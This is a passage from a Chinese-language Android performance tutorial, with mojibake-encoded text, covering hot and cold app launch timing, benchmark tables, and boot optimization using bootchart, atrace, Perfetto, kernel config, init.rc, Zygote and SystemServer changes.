        <span class="hljs-keyword">val</span> startTime = System.currentTimeMillis()
        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        <span class="hljs-comment">// ç­‰å¾…é¦–å¸§æ¸²æŸ“</span>
        window.decorView.viewTreeObserver.addOnPreDrawListener(
            <span class="hljs-keyword">object</span> : ViewTreeObserver.OnPreDrawListener {
                <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onPreDraw</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Boolean</span> {
                    window.decorView.viewTreeObserver.removeOnPreDrawListener(<span class="hljs-keyword">this</span>)
                    <span class="hljs-keyword">val</span> totalTime = System.currentTimeMillis() - startTime
                    Log.d(<span class="hljs-string">"Performance"</span>, <span class="hljs-string">"Activity+é¦–å±è€—æ—¶: <span class="hljs-subst">${totalTime}</span>ms"</span>)
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
                }
            }
        )
    }
}
</code></pre>
<p><strong>å†·å¯åŠ¨æ€§èƒ½åŸºå‡†</strong>:</p>









































<table><thead><tr><th align="left">è¯„çº§</th><th align="left">è€—æ—¶èŒƒå›´</th><th align="left">ç”¨æˆ·ä½“éªŒ</th><th align="left">å»ºè®®</th></tr></thead><tbody><tr><td align="left">âœ… ä¼˜ç§€</td><td align="left">&lt; 1s</td><td align="left">å‡ ä¹æ— æ„ŸçŸ¥</td><td align="left">ä¿æŒ,å¯ä½œä¸ºæ ‡æ†</td></tr><tr><td align="left">âš ï¸ è‰¯å¥½</td><td align="left">1-1.5s</td><td align="left">è½»å¾®ç­‰å¾…æ„Ÿ</td><td align="left">æœ‰ä¼˜åŒ–ç©ºé—´</td></tr><tr><td align="left">âš ï¸ ä¸€èˆ¬</td><td align="left">1.5-2s</td><td align="left">æ˜æ˜¾ç­‰å¾…</td><td align="left">éœ€è¦ä¼˜åŒ–</td></tr><tr><td align="left">âŒ è¾ƒå·®</td><td align="left">2-3s</td><td align="left">è¾ƒé•¿ç­‰å¾…</td><td align="left">å¿…é¡»ä¼˜åŒ–</td></tr><tr><td align="left">âŒ å¾ˆå·®</td><td align="left">&gt; 3s</td><td align="left">æƒ³å…³é—­App</td><td align="left">ä¸¥é‡é—®é¢˜</td></tr></tbody></table>
<h3 data-id="heading-5">1.4 Appçƒ­å¯åŠ¨:ä»åå°æ¢å¤çš„å¿«é€Ÿè·¯å¾„</h3>
<p>çƒ­å¯åŠ¨æ˜¯Appè¿›ç¨‹å·²å­˜åœ¨,åªéœ€æ¢å¤Activityå’ŒUIçŠ¶æ€çš„å¿«é€Ÿå¯åŠ¨æ–¹å¼ã€‚</p>
<p><strong>å¯åŠ¨æµç¨‹å›¾</strong>:</p>
<pre><code class="hljs language-scss" lang="scss">ç”¨æˆ·ä»Recentæˆ–æŒ‰è¿”å›é”®
   â†“
<span class="hljs-built_in">ActivityManagerService</span>(AMS)æ£€æµ‹åˆ°è¿›ç¨‹å­˜åœ¨
   â†“
ç›´æ¥æ¢å¤Activityæ ˆ
   â†“
Activity<span class="hljs-selector-class">.onRestart</span>() æ‰§è¡Œ (<span class="hljs-number">10</span>-<span class="hljs-number">50ms</span>)
   â†“
Activity<span class="hljs-selector-class">.onStart</span>() æ‰§è¡Œ (<span class="hljs-number">10</span>-<span class="hljs-number">50ms</span>)
   â†“
Activity<span class="hljs-selector-class">.onResume</span>() æ‰§è¡Œ (<span class="hljs-number">30</span>-<span class="hljs-number">100ms</span>)
   â”œâ”€ åˆ·æ–°æ•°æ®
   â””â”€ æ¢å¤UIçŠ¶æ€
   â†“
Viewé‡å»º/æ›´æ–° (<span class="hljs-number">50</span>-<span class="hljs-number">150ms</span>)
   â†“
é¦–å¸§æ¸²æŸ“ (<span class="hljs-number">50</span>-<span class="hljs-number">100ms</span>)
   â†“
ç”¨æˆ·çœ‹åˆ°ç•Œé¢!
</code></pre>
<p><strong>è€—æ—¶åˆ†å¸ƒ</strong> (æŸç¤¾äº¤Appå®æµ‹æ•°æ®):</p>















































<table><thead><tr><th align="left">é˜¶æ®µ</th><th align="right">è€—æ—¶</th><th align="right">å æ¯”</th><th align="left">å¯ä¼˜åŒ–ç©ºé—´</th></tr></thead><tbody><tr><td align="left">onRestart()</td><td align="right">20ms</td><td align="right">4%</td><td align="left">âœ… é¿å…é‡å¤æ“ä½œ</td></tr><tr><td align="left">onStart()</td><td align="right">30ms</td><td align="right">6%</td><td align="left">âœ… ç¼“å­˜æ•°æ®</td></tr><tr><td align="left">onResume()</td><td align="right">150ms</td><td align="right">30%</td><td align="left">âœ… å¼‚æ­¥åˆ·æ–°</td></tr><tr><td align="left">Viewé‡å»º</td><td align="right">200ms</td><td align="right">40%</td><td align="left">âœ… çŠ¶æ€ç¼“å­˜</td></tr><tr><td align="left">æ¸²æŸ“æ›´æ–°</td><td align="right">100ms</td><td align="right">20%</td><td align="left">âœ… å±€éƒ¨åˆ·æ–°</td></tr><tr><td align="left"><strong>æ€»è®¡</strong></td><td align="right"><strong>500ms</strong></td><td align="right"><strong>100%</strong></td><td align="left"><strong>ä¼˜åŒ–åˆ°300ms</strong></td></tr></tbody></table>
<p><strong>çƒ­å¯åŠ¨æ€§èƒ½åŸºå‡†</strong>:</p>

























<table><thead><tr><th align="left">è¯„çº§</th><th align="left">è€—æ—¶èŒƒå›´</th><th align="left">ç”¨æˆ·ä½“éªŒ</th></tr></thead><tbody><tr><td align="left">âœ… ä¼˜ç§€</td><td align="left">&lt; 300ms</td><td align="left">å³æ—¶å“åº”</td></tr><tr><td align="left">âš ï¸ è‰¯å¥½</td><td align="left">300-500ms</td><td align="left">è½»å¾®å»¶è¿Ÿ</td></tr><tr><td align="left">âŒ è¾ƒå·®</td><td align="left">&gt; 500ms</td><td align="left">æ˜æ˜¾å¡é¡¿</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-6">äºŒã€System Bootå¯åŠ¨ä¼˜åŒ–:ç³»ç»Ÿçº§æ€§èƒ½è°ƒä¼˜</h2>
<p>System Bootä¼˜åŒ–ä¸»è¦é’ˆå¯¹<strong>ç³»ç»Ÿå¼€å‘è€…</strong>å’Œ<strong>è½¦è½½ç³»ç»Ÿå·¥ç¨‹å¸ˆ</strong>,éœ€è¦ç³»ç»Ÿçº§æƒé™å’Œæºç è®¿é—®ã€‚æ™®é€šAppå¼€å‘è€…å¯ä»¥è·³è¿‡æ­¤èŠ‚ã€‚</p>
<h3 data-id="heading-7">2.1 Bootæ€§èƒ½åˆ†ææ–¹æ³•</h3>
<h4 data-id="heading-8">æ–¹æ³•1: ä½¿ç”¨Bootchartåˆ†ææ•´ä½“å¯åŠ¨æ—¶é—´</h4>
<p>Bootchartæ˜¯Androidæä¾›çš„Bootæ€§èƒ½åˆ†æå·¥å…·,ç”ŸæˆCPUã€I/Oã€è¿›ç¨‹çš„æ—¶é—´å›¾è¡¨ã€‚</p>
<p><strong>å¼€å¯Bootchart</strong>:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. å¼€å¯bootchart (é‡å¯ç”Ÿæ•ˆ)</span>
adb root
adb shell <span class="hljs-string">'echo 1 &gt; /data/bootchart/enabled'</span>
adb reboot

<span class="hljs-comment"># 2. è®¾å¤‡å¯åŠ¨å®Œæˆå,è·å–bootchartæ•°æ®</span>
adb pull /data/bootchart bootchart/

<span class="hljs-comment"># 3. ç”ŸæˆPNGå›¾è¡¨ (éœ€è¦bootchartå·¥å…·)</span>
bootchart bootchart/

<span class="hljs-comment"># æŸ¥çœ‹ç”Ÿæˆçš„ bootchart.png</span>
</code></pre>
<p><strong>Bootchartå›¾è¡¨è§£è¯»</strong>:</p>
<ul>
<li><strong>CPUä½¿ç”¨ç‡</strong>: å“ªä¸ªè¿›ç¨‹å ç”¨CPUæœ€å¤š</li>
<li><strong>I/Oç­‰å¾…</strong>: æ˜¯å¦æœ‰I/Oç“¶é¢ˆ</li>
<li><strong>è¿›ç¨‹å¯åŠ¨é¡ºåº</strong>: å“ªäº›è¿›ç¨‹å¯åŠ¨æ—©,å“ªäº›å¯åŠ¨æ™š</li>
<li><strong>å…³é”®æ—¶é—´èŠ‚ç‚¹</strong>: <code>boot_progress_*</code> äº‹ä»¶</li>
</ul>
<h4 data-id="heading-9">æ–¹æ³•2: ä½¿ç”¨Systraceåˆ†æå¯åŠ¨ç»†èŠ‚</h4>
<p>Systraceå¯ä»¥æŠ“å–Bootè¿‡ç¨‹çš„è¯¦ç»†trace,åˆ†ææ¯ä¸ªæœåŠ¡çš„å¯åŠ¨è€—æ—¶ã€‚</p>
<p><strong>æŠ“å–Boot Trace</strong>:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ–¹æ³•1: å¼€æœºæ—¶è‡ªåŠ¨æŠ“å– (éœ€è¦ä¿®æ”¹init.rc)</span>
<span class="hljs-comment"># åœ¨ init.rc ä¸­æ·»åŠ :</span>
on boot
    <span class="hljs-comment"># å¼€å¯ftrace</span>
    write /sys/kernel/debug/tracing/tracing_on 1
    write /sys/kernel/debug/tracing/events/sched/enable 1

<span class="hljs-comment"># æ–¹æ³•2: æ‰‹åŠ¨æŠ“å–é‡å¯åçš„trace</span>
adb shell atrace --async_start -b 32768 -c \
    <span class="hljs-built_in">sched</span> freq idle load disk mmc am wm gfx view dalvik

<span class="hljs-comment"># é‡å¯è®¾å¤‡</span>
adb reboot

<span class="hljs-comment"># å¯åŠ¨å®Œæˆååœæ­¢æŠ“å–</span>
adb wait-for-device
adb shell atrace --async_stop -o /data/local/tmp/boot_trace.txt
adb pull /data/local/tmp/boot_trace.txt

<span class="hljs-comment"># ä½¿ç”¨Perfetto UIæŸ¥çœ‹</span>
<span class="hljs-comment"># æ‰“å¼€ ui.perfetto.dev,ä¸Šä¼ traceæ–‡ä»¶</span>
</code></pre>
<p><strong>å…³é”®æŒ‡æ ‡æŸ¥çœ‹</strong>:</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- åœ¨Perfetto UIçš„SQLæŸ¥è¯¢ä¸­æ‰§è¡Œ</span>
<span class="hljs-comment">-- æŸ¥çœ‹boot_progressäº‹ä»¶çš„æ—¶é—´</span>
<span class="hljs-keyword">SELECT</span>
  ts <span class="hljs-operator">/</span> <span class="hljs-number">1e9</span> <span class="hljs-keyword">AS</span> time_sec,
  name,
  <span class="hljs-built_in">CAST</span>(<span class="hljs-keyword">value</span> <span class="hljs-keyword">AS</span> TEXT) <span class="hljs-keyword">AS</span> timestamp_ms
<span class="hljs-keyword">FROM</span> counter
<span class="hljs-keyword">JOIN</span> counter_track <span class="hljs-keyword">ON</span> counter.track_id <span class="hljs-operator">=</span> counter_track.id
<span class="hljs-keyword">WHERE</span> counter_track.name <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'boot_progress%'</span>
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> ts;
</code></pre>
<h4 data-id="heading-10">æ–¹æ³•3: ä½¿ç”¨logcatåˆ†æå…³é”®äº‹ä»¶</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># è¿‡æ»¤bootç›¸å…³æ—¥å¿—</span>
adb logcat -d | grep -E <span class="hljs-string">"boot_progress|SystemServer"</span>

<span class="hljs-comment"># è¾“å‡ºç¤ºä¾‹:</span>
<span class="hljs-comment"># boot_progress_start: 12345</span>
<span class="hljs-comment"># boot_progress_preload_start: 15678</span>
<span class="hljs-comment"># boot_progress_preload_end: 18901</span>
<span class="hljs-comment"># boot_progress_system_run: 21234</span>
<span class="hljs-comment"># boot_progress_pms_start: 22345</span>
<span class="hljs-comment"># boot_progress_pms_ready: 28901</span>
<span class="hljs-comment"># boot_progress_ams_ready: 32345</span>
<span class="hljs-comment"># boot_progress_enable_screen: 35678</span>
</code></pre>
<h3 data-id="heading-11">2.2 Kernelå¯åŠ¨ä¼˜åŒ–</h3>
<h4 data-id="heading-12">ä¼˜åŒ–1: ç²¾ç®€å†…æ ¸é…ç½®</h4>
<p><strong>ç§»é™¤ä¸éœ€è¦çš„åŠŸèƒ½</strong>:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç¼–è¾‘å†…æ ¸é…ç½® kernel/.config</span>
<span class="hljs-comment"># ç¦ç”¨ä¸éœ€è¦çš„åŠŸèƒ½å¯å‡å°‘å†…æ ¸å¤§å°å’Œå¯åŠ¨æ—¶é—´</span>

<span class="hljs-comment"># ç¤ºä¾‹:ç¦ç”¨è°ƒè¯•åŠŸèƒ½</span>
CONFIG_DEBUG_KERNEL=n
CONFIG_DEBUG_INFO=n
CONFIG_KALLSYMS=n

<span class="hljs-comment"># ç¦ç”¨ä¸éœ€è¦çš„æ–‡ä»¶ç³»ç»Ÿ</span>
CONFIG_BTRFS_FS=n
CONFIG_XFS_FS=n

<span class="hljs-comment"># ç¦ç”¨ä¸éœ€è¦çš„ç½‘ç»œåè®®</span>
CONFIG_NETFILTER=n
CONFIG_IPV6=n

<span class="hljs-comment"># é‡æ–°ç¼–è¯‘å†…æ ¸</span>
make -j8
</code></pre>
<p><strong>å®æµ‹æ•ˆæœ</strong>: èŠ‚çœ1-2ç§’</p>
<h4 data-id="heading-13">ä¼˜åŒ–2: ä¼˜åŒ–æ–‡ä»¶ç³»ç»ŸæŒ‚è½½</h4>
<p><strong>å¹¶è¡ŒæŒ‚è½½åˆ†åŒº</strong>:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä¿®æ”¹ init.rc</span>
<span class="hljs-comment"># ä¼˜åŒ–å‰:ä¸²è¡ŒæŒ‚è½½</span>
on fs
    mount ext4 /dev/block/by-name/system /system
    mount ext4 /dev/block/by-name/vendor /vendor
    mount ext4 /dev/block/by-name/userdata /data

<span class="hljs-comment"># ä¼˜åŒ–å:å¹¶è¡ŒæŒ‚è½½</span>
on fs
    <span class="hljs-built_in">exec</span> - root -- /system/bin/sh -c <span class="hljs-string">"mount ext4 /dev/block/by-name/system /system &amp;"</span>
    <span class="hljs-built_in">exec</span> - root -- /system/bin/sh -c <span class="hljs-string">"mount ext4 /dev/block/by-name/vendor /vendor &amp;"</span>
    mount ext4 /dev/block/by-name/userdata /data
</code></pre>
<p><strong>ä½¿ç”¨noatimeé€‰é¡¹</strong>:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŒ‚è½½æ—¶ç¦ç”¨atime(è®¿é—®æ—¶é—´)æ›´æ–°,å‡å°‘I/O</span>
mount ext4 /dev/block/by-name/userdata /data noatime,nosuid,nodev
</code></pre>
<p><strong>å®æµ‹æ•ˆæœ</strong>: èŠ‚çœ0.5-1ç§’</p>
<h4 data-id="heading-14">ä¼˜åŒ–3: å»¶è¿ŸåŠ è½½éå…³é”®é©±åŠ¨</h4>
<p><strong>ä¿®æ”¹é©±åŠ¨åˆå§‹åŒ–é¡ºåº</strong>:</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// drivers/video/display_driver.c</span>
<span class="hljs-comment">// ä¼˜åŒ–å‰:device_initcall (å¯åŠ¨é˜¶æ®µ6)</span>
device_initcall(display_driver_init);

<span class="hljs-comment">// ä¼˜åŒ–å:late_initcall (å¯åŠ¨é˜¶æ®µ7,å»¶åæ‰§è¡Œ)</span>
late_initcall(display_driver_init);
</code></pre>
<p><strong>æŒ‰éœ€åŠ è½½é©±åŠ¨</strong>:</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// å°†é©±åŠ¨ç¼–è¯‘ä¸ºæ¨¡å—,å¯åŠ¨åå†åŠ è½½</span>
<span class="hljs-comment">// Kconfig</span>
config DISPLAY_DRIVER
    tristate <span class="hljs-string">"Display Driver"</span>  # æ”¹ä¸ºtristateè€Œé<span class="hljs-type">bool</span>
</code></pre>
<p><strong>å®æµ‹æ•ˆæœ</strong>: èŠ‚çœ1-3ç§’</p>
<h3 data-id="heading-15">2.3 Inité˜¶æ®µä¼˜åŒ–</h3>
<h4 data-id="heading-16">ä¼˜åŒ–1: å¹¶è¡Œå¯åŠ¨æœåŠ¡</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># init.rc</span>
<span class="hljs-comment"># ä¼˜åŒ–å‰:ä¸²è¡Œå¯åŠ¨</span>
on boot
    start serviceA
    start serviceB
    start serviceC

<span class="hljs-comment"># ä¼˜åŒ–å:å¹¶è¡Œå¯åŠ¨(ä½¿ç”¨&amp;åå°æ‰§è¡Œ)</span>
on boot
    <span class="hljs-built_in">exec</span> - root -- /system/bin/sh -c <span class="hljs-string">"start serviceA &amp;"</span>
    <span class="hljs-built_in">exec</span> - root -- /system/bin/sh -c <span class="hljs-string">"start serviceB &amp;"</span>
    <span class="hljs-built_in">exec</span> - root -- /system/bin/sh -c <span class="hljs-string">"start serviceC &amp;"</span>
</code></pre>
<h4 data-id="heading-17">ä¼˜åŒ–2: å»¶è¿Ÿå¯åŠ¨éå…³é”®æœåŠ¡</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># init.rc</span>
<span class="hljs-comment"># ä¼˜åŒ–å‰:æ‰€æœ‰æœåŠ¡åœ¨booté˜¶æ®µå¯åŠ¨</span>
on boot
    start critical_service
    start non_critical_service_1
    start non_critical_service_2

<span class="hljs-comment"># ä¼˜åŒ–å:å…³é”®æœåŠ¡ç«‹å³å¯åŠ¨,éå…³é”®æœåŠ¡å»¶å</span>
on boot
    start critical_service

<span class="hljs-comment"># Bootå®Œæˆåå†å¯åŠ¨éå…³é”®æœåŠ¡</span>
on property:sys.boot_completed=1
    start non_critical_service_1
    start non_critical_service_2
</code></pre>
<h4 data-id="heading-18">ä¼˜åŒ–3: ç²¾ç®€init.rc</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç§»é™¤ä¸éœ€è¦çš„onè§¦å‘å™¨å’Œexecå‘½ä»¤</span>
<span class="hljs-comment"># åˆå¹¶é‡å¤çš„å±æ€§è®¾ç½®</span>
<span class="hljs-comment"># ä¼˜åŒ–å‰:</span>
on boot
    setprop prop1 value1
on boot
    setprop prop2 value2

<span class="hljs-comment"># ä¼˜åŒ–å:</span>
on boot
    setprop prop1 value1
    setprop prop2 value2
</code></pre>
<p><strong>å®æµ‹æ•ˆæœ</strong>: Inité˜¶æ®µä»10ç§’ä¼˜åŒ–åˆ°6ç§’</p>
<h3 data-id="heading-19">2.4 Zygoteå¯åŠ¨ä¼˜åŒ–</h3>
<h4 data-id="heading-20">ä¼˜åŒ–1: ç²¾ç®€é¢„åŠ è½½ç±»åˆ—è¡¨</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç¼–è¾‘é¢„åŠ è½½ç±»åˆ—è¡¨</span>
<span class="hljs-comment"># frameworks/base/config/preloaded-classes</span>

<span class="hljs-comment"># ä¼˜åŒ–å‰:çº¦5000ä¸ªç±»</span>
<span class="hljs-comment"># ä¼˜åŒ–å:ç§»é™¤ä¸å¸¸ç”¨çš„ç±»,ä¿ç•™çº¦3500ä¸ª</span>

<span class="hljs-comment"># åˆ†ææ–¹æ³•:é€šè¿‡SystraceæŸ¥çœ‹å“ªäº›ç±»çœŸæ­£è¢«ä½¿ç”¨</span>
<span class="hljs-comment"># ç§»é™¤ç¤ºä¾‹:</span>
<span class="hljs-comment"># android.bluetooth.*  # å¦‚æœè®¾å¤‡æ— è“ç‰™</span>
<span class="hljs-comment"># android.nfc.*        # å¦‚æœè®¾å¤‡æ— NFC</span>
<span class="hljs-comment"># com.android.internal.telephony.*  # å¦‚æœè®¾å¤‡æ— ç”µè¯åŠŸèƒ½</span>
</code></pre>
<p><strong>éªŒè¯è„šæœ¬</strong>:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># ç»Ÿè®¡ç±»çš„ä½¿ç”¨é¢‘ç‡</span>
adb logcat -c
adb logcat | grep <span class="hljs-string">"Class load"</span> &gt; class_usage.log
<span class="hljs-comment"># è¿è¡Œä¸€å¤©ååˆ†æ</span>
awk <span class="hljs-string">'{print $NF}'</span> class_usage.log | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr &gt; class_frequency.txt
</code></pre>
<p><strong>å®æµ‹æ•ˆæœ</strong>: Zygoteå¯åŠ¨ä»5ç§’ä¼˜åŒ–åˆ°3ç§’</p>
<h4 data-id="heading-21">ä¼˜åŒ–2: ä¼˜åŒ–é¢„åŠ è½½èµ„æº</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// frameworks/base/core/java/android/app/ApplicationLoaders.java</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">preloadResources</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// ä¼˜åŒ–å‰:é¢„åŠ è½½æ‰€æœ‰drawable</span>
    <span class="hljs-type">Resources</span> <span class="hljs-variable">resources</span> <span class="hljs-operator">=</span> Resources.getSystem();
    resources.preloadDrawables();

    <span class="hljs-comment">// ä¼˜åŒ–å:åªé¢„åŠ è½½å¸¸ç”¨drawable</span>
    <span class="hljs-type">int</span>[] commonDrawables = {
        android.R.drawable.ic_menu_add,
        android.R.drawable.ic_menu_delete,
        <span class="hljs-comment">// ... åªåˆ—å‡ºæœ€å¸¸ç”¨çš„100ä¸ª</span>
    };
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> id : commonDrawables) {
        resources.getDrawable(id, <span class="hljs-literal">null</span>);
    }
}
</code></pre>
<p><strong>å®æµ‹æ•ˆæœ</strong>: èŠ‚çœ0.5-1ç§’</p>
<h3 data-id="heading-22">2.5 SystemServerå¯åŠ¨ä¼˜åŒ–</h3>
<p>SystemServeræ˜¯ä¼˜åŒ–ç©ºé—´æœ€å¤§çš„ç¯èŠ‚,åŒ…å«çº¦80ä¸ªç³»ç»ŸæœåŠ¡ã€‚</p>
<h4 data-id="heading-23">ä¼˜åŒ–1: åˆ†é˜¶æ®µã€åˆ†ä¼˜å…ˆçº§å¯åŠ¨æœåŠ¡</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// frameworks/base/services/java/com/android/server/SystemServer.java</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// é˜¶æ®µ1: Bootstrap Services (å¿…é¡»ç«‹å³å¯åŠ¨)</span>
    startBootstrapServices();
    <span class="hljs-comment">// AMS, PMS, PowerManager...</span>

    <span class="hljs-comment">// é˜¶æ®µ2: Core Services (å¿…é¡»æœåŠ¡,ä½†å¯ç¨å)</span>
    startCoreServices();
    <span class="hljs-comment">// BatteryService, UsageStatsService...</span>

    <span class="hljs-comment">// é˜¶æ®µ3: Other Services (å¯å»¶åå¯åŠ¨)</span>
    startOtherServices();
    <span class="hljs-comment">// LocationManager, NetworkPolicy, MediaRouter...</span>

    <span class="hljs-comment">// é˜¶æ®µ4: å»¶è¿ŸæœåŠ¡ (Bootå®Œæˆåå¯åŠ¨)</span>
    mHandler.postDelayed(() -&gt; {
        startDelayedServices();
    }, <span class="hljs-number">5000</span>);
}

<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">startDelayedServices</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// éå…³é”®æœåŠ¡å»¶å5ç§’å¯åŠ¨</span>
    <span class="hljs-comment">// ä¾‹å¦‚:TelephonyRegistry, NetworkTime, Wallpaper...</span>
}
</code></pre>
<h4 data-id="heading-24">ä¼˜åŒ–2: å¹¶è¡Œå¯åŠ¨æœåŠ¡</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// SystemServer.java</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">startOtherServices</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// ä¼˜åŒ–å‰:ä¸²è¡Œå¯åŠ¨</span>
    startService(LocationManagerService.class);
    startService(NetworkPolicyManagerService.class);
    startService(MediaRouterService.class);

    <span class="hljs-comment">// ä¼˜åŒ–å:å¹¶è¡Œå¯åŠ¨(ä½¿ç”¨çº¿ç¨‹æ± )</span>
    <span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">4</span>);

    executor.submit(() -&gt; startService(LocationManagerService.class));
    executor.submit(() -&gt; startService(NetworkPolicyManagerService.class));
    executor.submit(() -&gt; startService(MediaRouterService.class));

    <span class="hljs-comment">// ç­‰å¾…å…³é”®æœåŠ¡å¯åŠ¨å®Œæˆ</span>
    executor.shutdown();
    executor.awaitTermination(<span class="hljs-number">10</span>, TimeUnit.SECONDS);
}
</code></pre>
<h4 data-id="heading-25">ä¼˜åŒ–3: å»¶è¿Ÿåˆå§‹åŒ–æœåŠ¡å†…éƒ¨é€»è¾‘</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç¤ºä¾‹: LocationManagerService</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LocationManagerService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ILocationManager</span>.Stub {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">systemReady</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ä¼˜åŒ–å‰:systemReadyæ—¶å°±åŠ è½½æ‰€æœ‰Provider</span>
        loadProviders();

        <span class="hljs-comment">// ä¼˜åŒ–å:å»¶è¿ŸåŠ è½½,åªåŠ è½½å¿…é¡»çš„GPS Provider</span>
        loadGpsProvider();

        <span class="hljs-comment">// å…¶ä»–Provideråœ¨é¦–æ¬¡ä½¿ç”¨æ—¶å†åŠ è½½</span>
        mHandler.postDelayed(() -&gt; {
            loadNetworkProvider();
            loadPassiveProvider();
        }, <span class="hljs-number">10000</span>);
    }
}
</code></pre>
<p><strong>Bootä¼˜åŒ–æ•ˆæœæ€»ç»“</strong>:</p>









































<table><thead><tr><th align="left">ä¼˜åŒ–é¡¹</th><th align="right">ä¼˜åŒ–å‰</th><th align="right">ä¼˜åŒ–å</th><th align="right">èŠ‚çœæ—¶é—´</th></tr></thead><tbody><tr><td align="left">Kernelå¯åŠ¨</td><td align="right">8s</td><td align="right">5s</td><td align="right">3s â¬‡ï¸</td></tr><tr><td align="left">Inité˜¶æ®µ</td><td align="right">10s</td><td align="right">6s</td><td align="right">4s â¬‡ï¸</td></tr><tr><td align="left">Zygoteå¯åŠ¨</td><td align="right">5s</td><td align="right">3s</td><td align="right">2s â¬‡ï¸</td></tr><tr><td align="left">SystemServerå¯åŠ¨</td><td align="right">15s</td><td align="right">9s</td><td align="right">6s â¬‡ï¸</td></tr><tr><td align="left"><strong>æ€»Bootæ—¶é—´</strong></td><td align="right"><strong>48s</strong></td><td align="right"><strong>33s</strong></td><td align="right"><strong>15s â¬‡ï¸ (31%)</strong></td></tr></tbody></table>
<hr/>
<h2 data-id="heading-26">ä¸‰ã€Appå†·å¯åŠ¨ä¼˜åŒ–:ä»3ç§’åˆ°1ç§’çš„å®æˆ˜</h2>
<p>Appå†·å¯åŠ¨æ˜¯ç”¨æˆ·æœ€å¸¸é‡åˆ°çš„åœºæ™¯,ä¹Ÿæ˜¯ä¼˜åŒ–æ•ˆæœæœ€æ˜æ˜¾çš„é¢†åŸŸã€‚æœ¬èŠ‚å°†æä¾›å®Œæ•´çš„ã€å¯è½åœ°çš„ä¼˜åŒ–æ–¹æ¡ˆã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f6c31764bc96441f8a922d4f6da97ae6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768400142&amp;x-signature=coOcq7eMXsjX85NM%2BsSoP89GfG8%3D" alt="09-03-cold-launch-optimization-tree.png" loading="lazy"/></p>
<h3 data-id="heading-27">3.1 å†·å¯åŠ¨æ€§èƒ½æµ‹é‡</h3>
<h4 data-id="heading-28">æ–¹æ³•1: ä½¿ç”¨adbå‘½ä»¤å¿«é€Ÿæµ‹é‡</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®Œå…¨å†·å¯åŠ¨ (æ¸…é™¤æ•°æ®+force-stop)</span>
adb shell am force-stop com.example.myapp
adb shell pm clear com.example.myapp

<span class="hljs-comment"># å¯åŠ¨å¹¶æµ‹é‡æ—¶é—´</span>
adb shell am start-activity -W com.example.myapp/.MainActivity

<span class="hljs-comment"># è¾“å‡º:</span>
<span class="hljs-comment"># Starting: Intent { act=android.intent.action.MAIN ... }</span>
<span class="hljs-comment"># Status: ok</span>
<span class="hljs-comment"># Activity: com.example.myapp/.MainActivity</span>
<span class="hljs-comment"># ThisTime: 1245        â† Activityå¯åŠ¨è€—æ—¶</span>
<span class="hljs-comment"># TotalTime: 1245       â† æ€»å¯åŠ¨è€—æ—¶ (è¿™å°±æ˜¯å†·å¯åŠ¨æ—¶é—´)</span>
<span class="hljs-comment"># WaitTime: 1267        â† åŒ…æ‹¬ç³»ç»Ÿå¤„ç†æ—¶é—´</span>
<span class="hljs-comment"># Complete</span>
</code></pre>
<h4 data-id="heading-29">æ–¹æ³•2: ä½¿ç”¨Systraceç²¾ç¡®åˆ†æ</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. æ¸…é™¤Appæ•°æ®</span>
adb shell am force-stop com.example.myapp
adb shell pm clear com.example.myapp

